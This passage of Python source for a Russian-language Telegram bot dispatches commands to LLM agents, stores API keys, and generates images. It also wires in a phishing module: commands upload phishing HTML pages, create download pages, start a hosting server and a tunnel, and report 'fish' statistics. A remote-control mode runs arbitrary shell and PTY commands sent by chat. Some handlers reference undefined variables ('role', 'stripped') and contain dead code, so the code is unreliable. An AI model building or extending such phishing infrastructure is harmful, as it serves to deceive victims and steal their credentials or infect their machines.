            "Агент сам найдёт и исправит (до 6 попыток).",
            chat_id, reply_markup=kb([btn("❌ Отмена", "cancel_wait")]))
    elif cmd == '/analyze':
        _wait_state[chat_id] = 'analyze_input'
        send_message(
            "🔍 <b>Анализ кода</b>\n\nОтправь код — получишь детальный разбор.",
            chat_id, reply_markup=kb([btn("❌ Отмена", "cancel_wait")]))
    elif cmd.startswith('/setllm'):
        parts = text.strip().split()
        if len(parts) >= 3:
            _apply_llm(parts[1], parts[2], parts[3] if len(parts) > 3 else None, chat_id)
        else:
            _wait_state[chat_id] = 'llm'
            send_message(
                "🧠 Введи LLM в формате: <code>провайдер модель [api_key]</code>\n\n"
                "Примеры:\n"
                "<code>ollama llama3.2</code>\n"
                "<code>gemini gemini-2.0-flash MY_KEY</code>\n"
                "<code>openai gpt-4o-mini MY_KEY</code>",
                chat_id)
    elif cmd.startswith('/setvoice'):
        parts = text.strip().split(maxsplit=1)
        if len(parts) >= 2:
            _apply_voice(parts[1].strip(), chat_id)
        else:
            _wait_state[chat_id] = 'voice'
            send_message("🎙 Введи ShortName голоса (из /voices):", chat_id)
    elif cmd in ('/chat', '/ai', '/агент'):
        start_session(chat_id, 'chat')
        send_message(
            "💬 <b>ИИ-чат активирован!</b>\n\n"
            "Просто пиши сообщения — я отвечу.\n"
            "Модель: <b>{} / {}</b>\n\n"
            "<i>Кнопки для управления ниже 👇</i>".format(config.LLM_PROVIDER, config.LLM_MODEL),
            chat_id, reply_markup=chat_control_keyboard()
        )
    elif cmd in ('/code', '/кодер', '/coder'):
        start_session(chat_id, 'code')
        send_message(
            "💻 <b>Агент-кодер v4</b>\n"
            "Модель: <b>{} / {}</b>\n\n"
            "Умеет:\n"
            "• Писать и запускать Python-код\n"
            "• Создавать Telegram-ботов и приложения\n"
            "• Генерировать изображения (Pillow, QR)\n"
            "• Анализировать код и находить баги\n"
            "• Исправлять ошибки авто-итерациями\n"
            "• Анализировать файлы и архивы\n\n"
            "<i>Пришли код + 'найди ошибки' — разберу.\n"
            "Пришли код + traceback + 'исправь' — починю.\n"
            "Просто опиши задачу — напишу.</i>".format(config.LLM_PROVIDER, config.LLM_MODEL),
            chat_id, reply_markup=chat_control_keyboard()
        )

    elif cmd in ('/provider', '/llm', '/модель'):
        # Быстрая смена провайдера
        _show_quick_provider(chat_id)

    # ── Фишинг-команды ────────────────────────────────────────────
    elif cmd in ('/fish', '/фиш'):
        if not FISH_ENABLED:
            send_message("❌ Фишинг-модуль не загружен.", chat_id)
        else:
            send_message("🎣 <b>Фишинг-модуль</b>", chat_id,
                         reply_markup=fish_menu_keyboard())

    elif cmd in ('/upload', '/загрузить', '/файл'):
        if not FISH_ENABLED:
            send_message("❌ Фишинг-модуль не загружен.", chat_id)
        else:
            _fish_handle_action('upload', chat_id)

    elif cmd in ('/html', '/загрузитьhtml', '/uploadhtml'):
        if not FISH_ENABLED:
            send_message("❌ Фишинг-модуль не загружен.", chat_id)
        else:
            _fish_handle_action('upload_html', chat_id)

    elif cmd in ('/files', '/файлы'):
        if not FISH_ENABLED:
            send_message("❌ Фишинг-модуль не загружен.", chat_id)
        else:
            _fish_handle_action('files', chat_id)

    elif cmd in ('/dl', '/стрдл', '/downloadpage'):
        if not FISH_ENABLED:
            send_message("❌ Фишинг-модуль не загружен.", chat_id)
        else:
            _fish_handle_action('create_dl', chat_id)

    elif cmd in ('/fishstats', '/фишстат'):
        if not FISH_ENABLED:
            send_message("❌ Фишинг-модуль не загружен.", chat_id)
        else:
            _fish_handle_action('fish_stats', chat_id)

    elif cmd in ('/tunnel', '/тоннель'):
        if not FISH_ENABLED:
            send_message("❌ Фишинг-модуль не загружен.", chat_id)
        else:
            _run_in_thread(_fish_handle_action, 'tunnel', chat_id)

    elif cmd in ('/server', '/сервер'):
        if not FISH_ENABLED:
            send_message("❌ Фишинг-модуль не загружен.", chat_id)
        else:
            if fish_bot_state.server_running:
                _fish_handle_action('server_stop', chat_id)
            else:
                _fish_handle_action('server_start', chat_id)
    elif cmd == '/endchat':
        info = session_info(chat_id)
        end_session(chat_id)
        if info:
            send_message("✅ Сессия завершена. Сообщений: {}".format(info['messages']), chat_id,
                        reply_markup=menu_keyboard(chat_id))
        else:
            send_message("Активной сессии не было.", chat_id)
    else:
        send_message(
            "❓ Не понимаю. Открой меню:", chat_id,
            reply_markup=kb([btn("📋 Открыть меню", "menu")])
        )


def _guard_lock(chat_id):
    """Возвращает True и пишет предупреждение если задача уже выполняется."""
    if _task_lock.locked():
        send_message("⏳ Уже выполняется задача, подожди...", chat_id)
        return True
    return False


def _handle_input(state, text, chat_id):
    """Обработка текстового ввода в режиме ожидания."""
    if state == 'custom_prompt':
        _apply_custom_prompt(text, chat_id)
    elif state == 'user_custom_prompt':
        if USER_SETTINGS_ENABLED:
            set_setting(chat_id, 'system_prompt', text.strip())
        send_message(f"✅ Промт сохранён:\n<i>{text[:200]}</i>", chat_id,
                     reply_markup=kb([btn("◀️ Настройки","user_settings")]))

    elif state == 'matrix_task':
        # ── AGENT MATRIX ──────────────────────────────────────────────────────
        if not MATRIX_ENABLED:
            send_message('❌ AGENT MATRIX не доступен', chat_id); return

        if text.strip().lower() in ('стоп','stop','/end','отмена'):
            _wait_state.pop(chat_id, None)
            send_message('🟥 MATRIX сессия завершена.', chat_id,
                         reply_markup=menu_keyboard(chat_id))
            return

        mx_task = text.strip()
        pf = _pending_file.get(chat_id)
        mx_files = [pf['path']] if pf and pf.get('path') and os.path.exists(pf['path']) else []

        send_message(
            f'🟥 <b>MATRIX принял задачу</b>\n<i>{mx_task[:100]}</i>',
            chat_id,
            reply_markup=kb([btn('❌ Остановить', 'matrix_stop')])
        )

        def _run_matrix_task(task=mx_task, cid=chat_id, files=mx_files):
            try:
                result = run_matrix(
                    task=task, chat_id=str(cid),
                    attached_files=files,
                    on_status=lambda m: send_message(f'⏳ {m}', cid),
                )
                if result is None:
                    send_message('❌ MATRIX вернул пустой результат', cid)
                    return

                answer = getattr(result, 'answer', '') or ''
                if answer:
                    send_message('🟥 <b>MATRIX:</b>\n\n' + answer[:3800], cid)

                tts = getattr(result, 'tts_path', None)
                if tts and os.path.exists(tts):
                    send_document(tts, caption='🎙 MATRIX озвучка', chat_id=cid)

                zp = getattr(result, 'zip_path', None)
                if zp and os.path.exists(zp):
                    size_kb = os.path.getsize(zp) // 1024
                    gen = getattr(result, 'generated_tools', [])
                    gen_info = f' · 🔧 создано инструментов: {len(gen)}' if gen else ''
                    send_document(zp,
                        caption=f'📦 <b>MATRIX артефакт</b>  {size_kb} KB{gen_info}',
                        chat_id=cid)

                ok = getattr(result, 'ok', True)
                steps = getattr(result, 'steps_done', 0)
                icon = '✅' if ok else '⚠️'
                # RLHF: кнопки фидбека
                _brain_task_key = f'brain_fb:{cid}:matrix:{int(time.time())}'
                _brain_tasks[_brain_task_key] = {'agent': 'matrix', 'task': mx_task,
                    'answer': str(getattr(result, 'answer', ''))[:500]}
                send_message(
                    f'{icon} <b>MATRIX завершил</b>  ({steps} шагов)\n'
                    f'<i>Пиши следующую задачу или нажми Стоп</i>',
                    cid,
                    reply_markup=kb(
                        [btn('👍 Хорошо', f'brain_fb:like:{_brain_task_key}'),
                         btn('👎 Плохо',  f'brain_fb:dislike:{_brain_task_key}')],
                        [btn('🟥 Ещё задача', 'matrix_start')],
                        [btn('◀️ Меню', 'menu')]
                    )
                )
                _wait_state[cid] = 'matrix_task'

            except Exception as e:
                import traceback
                send_message(f'❌ MATRIX ошибка: {e}\n<pre>{traceback.format_exc()[-400:]}</pre>',
                             cid, reply_markup=kb([btn('🟥 Повторить', 'matrix_start'),
                                                    btn('◀️ Меню', 'menu')]))

        _run_in_thread(_run_matrix_task)

    elif state == 'rc_shell':
        # ── Remote Control Shell ───────────────────────────────────────────────
        if not RC_ENABLED:
            _wait_state.pop(chat_id, None); return
        if role not in ('god', 'adm'):
            _wait_state.pop(chat_id, None); return

        cmd = text.strip()
        if cmd in ('/exit', 'exit', 'quit', '/quit', 'выход'):
            _wait_state.pop(chat_id, None)
            close_session(str(chat_id))
            send_message('💻 Shell завершён.',
                chat_id, reply_markup=kb([btn('🖥 RC Меню', 'rc_menu'), btn('◀️ Меню', 'menu')]))
            return

        allowed, reason = check_command_allowed(cmd, is_god=(role=='god'))
        if not allowed:
            send_message(f'❌ {reason}', chat_id); return

        sess = get_session(str(chat_id))
        ok, out = sess.run(cmd, timeout=30)
        icon = '✅' if ok else '❌'
        send_message(
            f'<code>{sess.get_prompt()}{cmd}</code>\n\n{icon}\n<pre>{out[:3500]}</pre>',
            chat_id,
            reply_markup=kb(
                [btn('🖥 RC Меню', 'rc_menu')],
            ))
        _wait_state[chat_id] = 'rc_shell'  # остаёмся в режиме shell

    elif state == 'rc_pty':
        # ── Remote Control PTY (интерактивный bash) ───────────────────────────
        if not RC_ENABLED:
            _wait_state.pop(chat_id, None); return
        if role not in ('god', 'adm'):
            _wait_state.pop(chat_id, None); return

        cmd = text.strip()
        if cmd in ('/exit', 'exit', 'quit', '/quit', 'выход'):
            _wait_state.pop(chat_id, None)
            pty_stop(str(chat_id))
            send_message('🔧 PTY закрыт.',
                chat_id, reply_markup=kb([btn('🖥 RC Меню', 'rc_menu'), btn('◀️ Меню', 'menu')]))
            return

        if not pty_is_active(str(chat_id)):
            pty_start(str(chat_id))

        ok, out = pty_write(str(chat_id), cmd)
        if out:
            send_message(f'<pre>{out[:3500]}</pre>', chat_id,
                reply_markup=kb([btn('❌ Закрыть PTY', 'rc_pty_stop')]))
        _wait_state[chat_id] = 'rc_pty'

    elif state == 'neo_task':
        # ── AGENT NEO — автономный агент ──────────────────────────────────
        if not NEO_ENABLED:
            send_message('❌ AGENT NEO не доступен', chat_id); return

        if text.strip().lower() in ('стоп','stop','/end','отмена','cancel'):
            _wait_state.pop(chat_id, None)
            send_message('🟢 NEO сессия завершена.', chat_id,
                         reply_markup=menu_keyboard(chat_id))
            return

        neo_task = text.strip()
        # Передаём прикреплённый файл если есть
        neo_files = []
        pf = _pending_file.get(chat_id)
        if pf and pf.get('path') and os.path.exists(pf['path']):
            neo_files = [pf['path']]

        send_message(
            f'🟢 <b>NEO принял задачу</b>\n<i>{neo_task[:100]}</i>',
            chat_id,
            reply_markup=kb([btn('❌ Остановить', 'neo_stop')])
        )

        def _run_neo_task(task=neo_task, cid=chat_id, files=neo_files):
            try:
                result = run_neo(
                    task=task,
                    chat_id=str(cid),
                    attached_files=files,
                    on_status=lambda m: send_message(f'⏳ {m}', cid),
                )
                if result is None:
                    send_message('❌ NEO вернул пустой результат', cid,
                                 reply_markup=kb([btn('🟢 Новая задача', 'neo_start'),
                                                  btn('◀️ Меню', 'menu')]))
                    return

                # Текстовый ответ
                answer = getattr(result, 'answer', None) or str(result)
                if answer:
                    send_message('🟢 <b>NEO:</b>\n\n' + answer[:3800], cid)

                # TTS аудио
                tts = getattr(result, 'tts_path', None)
                if tts and os.path.exists(tts):
                    send_document(tts, caption='🎙 NEO озвучка', chat_id=cid)

                # ZIP артефакт
                zp = getattr(result, 'zip_path', None)
                if zp and os.path.exists(zp):
                    size_kb = os.path.getsize(zp) // 1024
                    gen = getattr(result, 'generated_tools', [])
                    gen_info = f' · 🔧 новых инструментов: {len(gen)}' if gen else ''
                    send_document(zp,
                        caption=f'📦 <b>NEO артефакт</b>  {size_kb} KB{gen_info}',
                        chat_id=cid)

                ok = getattr(result, 'success', True)
                icon = '✅' if ok else '⚠️'
                steps = getattr(result, 'steps_done', 0)
                # RLHF: кнопки фидбека
                _brain_task_key = f'brain_fb:{cid}:neo:{int(time.time())}'
                _brain_tasks[_brain_task_key] = {'agent': 'neo', 'task': neo_task,
                    'answer': str(getattr(result, 'answer', ''))[:500]}
                send_message(
                    f'{icon} <b>NEO завершил</b>  ({steps} шагов)\n'
                    f'<i>Следующую задачу пиши сразу или нажми Стоп</i>',
                    cid,
                    reply_markup=kb(
                        [btn('👍 Хорошо', f'brain_fb:like:{_brain_task_key}'),
                         btn('👎 Плохо',  f'brain_fb:dislike:{_brain_task_key}')],
                        [btn('🟢 Ещё задача', 'neo_start')],
                        [btn('◀️ Меню', 'menu')]
                    )
                )
                # Остаёмся в сессии
                _wait_state[cid] = 'neo_task'

            except Exception as e:
                import traceback
                send_message(f'❌ NEO ошибка: {e}\n<pre>{traceback.format_exc()[-500:]}</pre>',
                             cid, reply_markup=kb([btn('🟢 Повторить', 'neo_start'),
                                                    btn('◀️ Меню', 'menu')]))

        _run_in_thread(_run_neo_task)

    elif state.startswith('morpheus_task'):
        # MORPHEUS — root system agent
        _morph_priv = 'user'
        try:
            from auth_module import get_user_privilege as _gup
            _morph_priv = _gup(chat_id) or _morph_priv
        except Exception:
            pass
        if _morph_priv not in ('god', 'owner', 'adm'):
            send_message('\U0001f6ab AGENT MORPHEUS: \u043d\u0435\u0434\u043e\u0441\u0442\u0430\u0442\u043e\u0447\u043d\u043e \u043f\u0440\u0430\u0432.', chat_id)
            _wait_state.pop(chat_id, None)
            return
        morph_task = stripped
        morph_mode = state.split(':', 1)[1] if ':' in state else 'auto'
        send_message(
            f'\U0001f535 <b>MORPHEUS \u043f\u0440\u0438\u043d\u044f\u043b \u0437\u0430\u0434\u0430\u0447\u0443</b>\n<i>{morph_task[:120]}</i>\n\n\u23f3 \u0412\u044b\u043f\u043e\u043b\u043d\u044f\u044e...',
            chat_id
        )

        def _run_morpheus(task=morph_task, cid=chat_id, mode=morph_mode):
            try:
                from agents.morpheus import AgentMorpheus
                agent = AgentMorpheus()
                result = agent.execute(
                    task=task,
                    chat_id=cid,
                    mode=mode,
                    on_status=lambda m: send_message(m, cid),
                )
                answer = result.answer or ('\u2705 \u0413\u043e\u0442\u043e\u0432\u043e' if result.ok else '\u274c \u041e\u0448\u0438\u0431\u043a\u0430')
                if not result.ok and result.error:
                    answer += f'\n\n\u274c {result.error}'
                send_message(
                    f'\U0001f535 <b>MORPHEUS</b>\n\n{answer[:3500]}',
                    cid,
                    reply_markup=kb([
                        [btn('\U0001f535 \u0415\u0449\u0451 \u043a\u043e\u043c\u0430\u043d\u0434\u0430', 'morpheus_start'),
                         btn('\u25c0\ufe0f \u041c\u0435\u043d\u044e', 'menu')],
                    ])
                )
                # Keep state for continued session
                _wait_state[cid] = f'morpheus_task:{mode}'
            except Exception as e:
                import traceback
                send_message(
                    f'\U0001f535 MORPHEUS \u043e\u0448\u0438\u0431\u043a\u0430: {e}\n<pre>{traceback.format_exc()[-400:]}</pre>',
                    cid,
                    reply_markup=kb([btn('\U0001f535 \u041f\u043e\u0432\u0442\u043e\u0440\u0438\u0442\u044c', 'morpheus_start'),
                                      btn('\u25c0\ufe0f \u041c\u0435\u043d\u044e', 'menu')])
                )

        _run_in_thread(_run_morpheus)

    elif state == 'adm_agent_task':
        # Описание задачи — агент анализирует и готовится
        from agent_session import (
            get_session, create_session, analyze_task,
            is_ready_trigger, is_cancel_trigger,
            has_active_session, STAGE_WAIT_FILES, execute_pipeline,
        )
        # Проверяем триггеры
        if is_cancel_trigger(text):
            from agent_session import close_session
            close_session(chat_id)
            send_message("❌ Сессия агента отменена.", chat_id,
                         reply_markup=kb([btn("◀️ Адм. меню","admin")]))
            return

        if is_ready_trigger(text):
            # Запускаем pipeline
            sess = get_session(chat_id)
            if not sess or not sess.task:
                send_message("❌ Сначала опиши задачу.", chat_id)
                _wait_state[chat_id] = 'adm_agent_task'
                return
            sess.stage = 'executing'
            send_message(
                f"🚀 <b>Запускаю pipeline!</b>\n"
                f"Задача: <i>{sess.task[:80]}</i>\n"
                f"Файлов: {len(sess.files)}\n\n"
                "⏳ Выполняю шаги...",
                chat_id, reply_markup=kb([btn("❌ Отмена","adm:close_agent")])
            )
            def _run_pipeline(_sess=sess):
                _gs.task_start(chat_id)
                try:
                    from agent_core import _llm_call
                    llm_fn = _llm_call
                except Exception:
                    llm_fn = None
                try:
                    sm = make_status(chat_id, send_message, edit_message)
                    result = execute_pipeline(
                        _sess,
                        on_status=sm.make_on_status(append=True),
                        llm_caller=llm_fn,
                    )
                    elapsed = f"{time.time() - _sess.created_at:.0f}с"
                    sm.done(f"{'✅' if result.get('ok') else '⚠️'} Готово за {elapsed}", keep=True)
                except Exception as exc:
                    send_message(f"❌ Ошибка pipeline: {exc}", chat_id)
                    result = {'artifacts':[],'errors':[str(exc)],'ok':False}
                finally:
                    _gs.task_done(chat_id)
                # Отправляем артефакты
                for art in result.get('artifacts', []):
                    if os.path.exists(art.get('path','')):
                        try:
                            send_document(art['path'],
                                         caption=f"📎 {art['name']}", chat_id=chat_id)
                        except Exception as e:
                            send_message(f"⚠️ {art['name']}: {e}", chat_id)
                # Отправляем ZIP
                if result.get('zip_path') and os.path.exists(result['zip_path']):
                    try:
                        send_document(result['zip_path'],
                                     caption="📦 <b>Все результаты</b>", chat_id=chat_id)
                    except Exception as e:
                        send_message(f"⚠️ ZIP: {e}", chat_id)
                errors = result.get('errors', [])
                icon   = "✅" if result.get('ok') else "⚠️"
                msg    = (
                    f"{icon} <b>Pipeline завершён</b>\n"
                    f"Артефактов: {len(result.get('artifacts',[]))}\n"
                )
                if errors:
                    msg += f"Ошибок: {len(errors)}\n" + "\n".join(f"• {e[:80]}" for e in errors[:3])
                _wait_state.pop(chat_id, None)
                send_message(msg, chat_id,
                             reply_markup=kb(
                                 [btn("🔄 Новая задача",   "adm:spawn_agent")],
                                 [btn("🕵️ АГЕНТ_СМИТ",    "adm:smith_menu")],
                                 [btn("◀️ Адм. меню",     "admin")],
                             ))
                from agent_session import close_session
                close_session(chat_id)
            _run_in_thread(_run_pipeline)
            return

        # Это описание задачи — анализируем
        sess = get_session(chat_id)
        if not sess:
            sess = create_session(chat_id)
        sess.task = text.strip()
        sess.stage = STAGE_WAIT_FILES
        sess.touch()

        # Анализируем задачу
        try:
            from agent_core import _llm_call
            analysis = analyze_task(text, _llm_call)
        except Exception:
            analysis = analyze_task(text)

        needs_files  = analysis.get('needs_files', False)
        tools        = analysis.get('tools', [])
        steps        = analysis.get('steps', [])
        file_types   = analysis.get('file_types', [])
        est_min      = analysis.get('estimated_minutes', 1)
        sess.tools_ready = tools

        steps_text = "\n".join(f"  {i+1}. {s}" for i, s in enumerate(steps))
        tools_text = ", ".join(f"<code>{t}</code>" for t in tools)

        if needs_files:
            msg = (
                f"🧠 <b>Задача понята!</b>\n\n"
                f"📋 <b>Что буду делать:</b>\n{steps_text}\n\n"
                f"🔧 <b>Инструменты:</b> {tools_text}\n"
                f"⏱ Примерно: ~{est_min} мин\n\n"
                f"📎 <b>Жду файлы:</b> {', '.join(file_types) or 'любые'}\n"
                f"Отправь их сейчас, затем напиши <b>готово</b>"
            )
        else:
            msg = (
                f"🧠 <b>Задача понята!</b>\n\n"
                f"📋 <b>Что буду делать:</b>\n{steps_text}\n\n"
                f"🔧 <b>Инструменты:</b> {tools_text}\n\n"
                "Напиши <b>готово</b> чтобы запустить, или уточни задачу."
            )
        sess.plan_text = msg
        send_message(msg, chat_id, reply_markup=kb(
            [btn("🚀 Готово — запустить","_agent_go")],
            [btn("❌ Отмена","adm:close_agent")],
        ))
        _wait_state[chat_id] = 'adm_agent_task'

    elif state.startswith('adm_sc_input:'):
        sc_mode = state.split(':', 1)[1]
        # Формируем задачу через шаблон
        SC_TEMPLATES = {
            'write':    "напиши рабочий Python-скрипт для задачи: {task}",
            'review':   "сделай code review, найди баги и уязвимости:\n{task}",
            'fix':      "исправь ошибку в этом коде:\n{task}",
            'project':  "создай полную структуру Python-проекта: {task}\nВключи main.py, requirements.txt, README.md, тесты",
            'file':     "создай файл: {task}",
            'scaffold': "создай полный scaffold Python-проекта типа: {task}",
            'refactor': "отрефактори этот код: добавь типы, docstrings, улучши структуру:\n{task}",
            'tests':    "напиши pytest тесты для этого кода с coverage 80%+:\n{task}",
            'analyze':  "проанализируй этот код: сложность, зависимости, проблемы:\n{task}",
            'dockerize':"создай Dockerfile + docker-compose.yml для: {task}",
        }
        template = SC_TEMPLATES.get(sc_mode, "выполни: {task}")
        full_task = template.format(task=text.strip())

        # Запускаем через сессию СМИТА
        from agent_session import get_session, create_session, execute_pipeline, close_session, STAGE_WAIT_FILES
        sess = get_session(chat_id)
        if not sess:
            sess = create_session(chat_id)
        sess.task  = full_task
        sess.stage = STAGE_WAIT_FILES
        sess.touch()

        send_message(
            f"🕵️💻 <b>АГЕНТ_СМИТ [{sc_mode.upper()}]</b>\n"
            f"Задача: <i>{text[:100]}</i>\n\n"
            "⏳ Выполняю...",
            chat_id,
            reply_markup=kb([btn("❌ Отмена","adm:close_agent")])
        )

        def _run_sc(_sess=sess, _chat=chat_id):
            try:
                from agent_core import _llm_call as llm_fn
            except Exception:
                llm_fn = None
            result = execute_pipeline(_sess, on_status=lambda m: send_message(m, _chat), llm_caller=llm_fn)
            from telegram_client import send_document as _sd
            import os as _os
            for art in result.get('artifacts', []):
                if _os.path.exists(art.get('path','')):
                    try: _sd(art['path'], caption=f"📎 {art['name']}", chat_id=_chat)
                    except Exception: pass
            if result.get('zip_path') and _os.path.exists(result['zip_path']):
                try: _sd(result['zip_path'], caption="📦 Результат СМИТА", chat_id=_chat)
                except Exception: pass
            errs = result.get('errors', [])
            send_message(
                f"{'✅' if result.get('ok') else '⚠️'} <b>СМИТ [{sc_mode.upper()}] завершил</b>\n"
                f"Артефактов: {len(result.get('artifacts',[]))}"
                + (f"\nОшибок: {len(errs)}" if errs else ""),
                _chat,
                reply_markup=kb(
                    [btn("💻 Ещё задача","adm:smith_coder")],
                    [btn("🕵️ АГЕНТ_СМИТ","adm:smith_menu")],
                    [btn("◀️ Адм. меню","admin")],
                ))
            try: close_session(_chat)
            except Exception: pass

        _run_in_thread(_run_sc)
        # Продолжение — пришёл текст во время ожидания файлов
        from agent_session import get_session, is_ready_trigger, is_cancel_trigger
        if is_ready_trigger(text) or is_cancel_trigger(text):
            _handle_input('adm_agent_task', text, chat_id)
        else:
            # Уточнение задачи
            sess = get_session(chat_id)
            if sess:
                sess.task += f"\n{text.strip()}"
                send_message(f"📝 Уточнение добавлено. Отправь файлы или напиши <b>готово</b>.", chat_id)
                _wait_state[chat_id] = 'adm_agent_task'

    elif state.startswith('vision_qa:'):
        file_id = state.split(':', 1)[1]
        question = text.strip()
        send_message("👁 Ищу ответ...", chat_id)
        def _do_vqa(fid=file_id, q=question):
            try:
                from agent_tools_registry import tool_vision_telegram
                result = tool_vision_telegram({'file_id': fid, 'question': q, 'mode': 'qa'}, chat_id=chat_id)
                import re; clean = re.sub(r'<[^>]+>', '', result)
                send_message(clean[:3500], chat_id, reply_markup=kb([btn("◀️ Меню","menu")]))
            except Exception as e:
                send_message(f"❌ {e}", chat_id)
        _run_in_thread(_do_vqa)
    elif state == 'voice':
        _apply_voice(text, chat_id)
    elif state == 'llm':
        parts = text.split()
        if len(parts) >= 2:
            _apply_llm(parts[0], parts[1], parts[2] if len(parts) > 2 else None, chat_id)
        else:
            send_message("❌ Неверный формат. Нужно: <code>провайдер модель [key]</code>", chat_id)

    elif state.startswith('llm_key:'):
        # Сохраняем API ключ для провайдера, затем показываем модели
        prov = state.split(':', 1)[1]
        api_key = text.strip()
        from llm_client import _PROVIDER_KEY_MAP
        key_attr = _PROVIDER_KEY_MAP.get(prov, 'LLM_API_KEY')
        _update_env(key_attr, api_key)          # провайдер-специфичный ключ
        _update_env('LLM_API_KEY', api_key)     # и универсальный
        # Переключаем провайдер сразу — ключ уже есть
        _update_env('LLM_PROVIDER', prov)
        config.reload()
        # Предлагаем выбрать модель
        models = RECOMMENDED.get(prov, [])
        rows = [[btn_model(m, prov, m)] for m in models[:8]]
        rows.append([btn('✏️ Ввести вручную', 'llm_manual:{}'.format(prov))])
        rows.append([back_btn('menu_llm')])
        send_message(
            '✅ Ключ для <b>{}</b> сохранён!\n\nТеперь выбери модель:'.format(prov.upper()),
            chat_id, reply_markup=kb(*rows))

    elif state.startswith('llm_manual_model:'):
        prov = state.split(':', 1)[1]
        model = text.strip()
        _apply_llm(prov, model, None, chat_id)
    elif state == 'eleven_key':
        _update_env('ELEVEN_API_KEY', text)
        config.reload()
        send_message("✅ ELEVEN_API_KEY сохранён.", chat_id,
                     reply_markup=kb([btn("◀️ Меню TTS", "menu_tts")]))
    elif state == 'eleven_voice':
        _update_env('ELEVEN_VOICE_ID', text)
        config.reload()
        send_message("✅ ElevenLabs voice_id: <b>{}</b>".format(text), chat_id,
                     reply_markup=kb([btn("◀️ Меню TTS", "menu_tts")]))

    # ── Генерация картинок ─────────────────────────────────────────
    elif state.startswith('img_prompt:'):
        provider = state.split(':', 1)[1]
        msg_ref = send_message(f"🎨 Генерирую: <i>{text[:80]}</i>...", chat_id)
        msg_id_img = msg_ref.get('result', {}).get('message_id') if msg_ref else None

        def _st_img(m):
            if msg_id_img:
                try: edit_message(chat_id, msg_id_img, m); return
                except Exception: pass
            send_message(m, chat_id)

        def _do_img():
            try:
                settings = _img_settings.get(chat_id, {})
                prompt_full = text
                if settings.get('style_suffix'):
                    prompt_full = text + ', ' + settings['style_suffix']
                size_str = settings.get('size', '1024x1024')
                w, h = (int(x) for x in size_str.split('x')) if 'x' in size_str else (1024, 1024)
                path, used = generate_image(prompt_full, provider=provider,
                                            on_status=_st_img, width=w, height=h)
                ok, err = send_photo_to(chat_id, path,
                    caption=f"🎨 {text[:100]}\n<i>Провайдер: {used}</i>")
                if not ok:
                    # Фото не прошло — шлём как документ
                    send_file_to(chat_id, path, caption=f"🎨 {text[:100]}")
            except Exception as e:
                send_message(f"❌ Ошибка генерации: {e}", chat_id)
            send_message("✅ Готово", chat_id, reply_markup=kb([
                btn("🎨 Ещё картинку",  "menu_image"),
                btn("◀️ Главное меню",  "menu"),
            ]))
        _run_in_thread(_do_img)

    elif state == 'img_add_key':
        parts = text.strip().split(None, 1)
        if len(parts) != 2:
            send_message("❌ Формат: <code>провайдер ВАШ_КЛЮЧ</code>\nПример: <code>dalle sk-abc123</code>",
                         chat_id, reply_markup=kb([btn("❌ Отмена", "menu_image")]))
        else:
            pname, key_val = parts
            key_map = {
                'dalle':        'OPENAI_API_KEY',
                'openai':       'OPENAI_API_KEY',
                'stability':    'STABILITY_API_KEY',
                'huggingface':  'HF_API_KEY',
                'hf':           'HF_API_KEY',
            }
            env_key = key_map.get(pname.lower())
            if env_key:
                _update_env(env_key, key_val.strip())
                config.reload()
                send_message(f"✅ Ключ для <b>{pname}</b> сохранён!\n"
                             f"Переменная: <code>{env_key}</code>",
                             chat_id, reply_markup=kb([btn("🎨 Генерировать", "menu_image")]))
            else:
                send_message(f"❌ Неизвестный провайдер: {pname}\n"
                             f"Доступны: dalle, stability, huggingface",
                             chat_id, reply_markup=kb([btn("❌ Отмена", "menu_image")]))

    # ── Добавление ключа LLM ───────────────────────────────────────
    elif state.startswith('llm_key_for:'):
        # Пользователь вставил ключ для конкретного провайдера
        pname   = state.split(':', 1)[1]
        key_val = text.strip()
        key_map = {
            'groq':       'GROQ_API_KEY',
            'openai':     'OPENAI_API_KEY',
            'gemini':     'GEMINI_API_KEY',
            'claude':     'ANTHROPIC_API_KEY',
            'anthropic':  'ANTHROPIC_API_KEY',
            'openrouter': 'OPENROUTER_API_KEY',
            'mistral':    'MISTRAL_API_KEY',
            'deepseek':   'DEEPSEEK_API_KEY',
            'xai':        'XAI_API_KEY',
            'cerebras':   'CEREBRAS_API_KEY',
            'sambanova':  'SAMBANOVA_API_KEY',
            'together':   'TOGETHER_API_KEY',
            'cohere':     'COHERE_API_KEY',
            'kimi':       'KIMI_API_KEY',
        }
        env_key = key_map.get(pname, pname.upper() + '_API_KEY')
        _update_env(env_key, key_val)       # провайдер-специфичный ключ
        _update_env('LLM_API_KEY', key_val)  # универсальный (для удобства тоже)
        _update_env('LLM_PROVIDER', pname)   # переключаем провайдер сразу
        config.reload()
        # Показываем модели для выбора
        models = RECOMMENDED.get(pname, [])
        rows = []
        for m in models[:8]:
            rows.append([btn(m, 'llm_setmodel:{}:{}'.format(pname, m))])
        rows.append([btn('✏️ Ввести модель вручную', 'llm_manual:{}'.format(pname))])
        rows.append([btn('🧪 Протестировать', 'test'), btn('◀️ LLM меню', 'menu_llm')])
        send_message(
            "✅ <b>Ключ для {} сохранён!</b>\n"
            "Провайдер активирован.\n\n"
            "Выбери модель:".format(pname.upper()),
            chat_id, reply_markup=kb(*rows))

    elif state == 'llm_add_key':
        parts = text.strip().split(None, 1)
        if len(parts) != 2:
            send_message("❌ Формат: <code>провайдер ВАШ_КЛЮЧ</code>\nПример: <code>groq gsk_abc</code>",
                         chat_id, reply_markup=kb([btn("❌ Отмена", "menu_llm")]))
        else:
            pname, key_val = parts
            pname = pname.lower().strip()
            key_map = {
                'groq':       'GROQ_API_KEY',
                'openai':     'OPENAI_API_KEY',
                'gemini':     'GEMINI_API_KEY',
                'claude':     'ANTHROPIC_API_KEY',
                'anthropic':  'ANTHROPIC_API_KEY',
                'openrouter': 'OPENROUTER_API_KEY',
                'mistral':    'MISTRAL_API_KEY',
                'deepseek':   'DEEPSEEK_API_KEY',
                'xai':        'XAI_API_KEY',
                'cerebras':   'CEREBRAS_API_KEY',
                'sambanova':  'SAMBANOVA_API_KEY',
                'together':   'TOGETHER_API_KEY',
                'cohere':     'COHERE_API_KEY',
                'perplexity': 'PERPLEXITY_API_KEY',
                'kimi':       'KIMI_API_KEY',
                'llama':      'LLAMA_API_KEY',
            }
            env_key = key_map.get(pname, pname.upper() + '_API_KEY')
            _update_env(env_key, key_val.strip())
            config.reload()
            # Автоматически переключаем на этот провайдер
            default_model = (RECOMMENDED.get(pname) or [''])[0]
            if default_model:
                config.set_llm(pname, default_model)
            send_message(
                f"✅ Ключ для <b>{pname}</b> сохранён!\n"
                f"<code>{env_key}</code>\n\n"
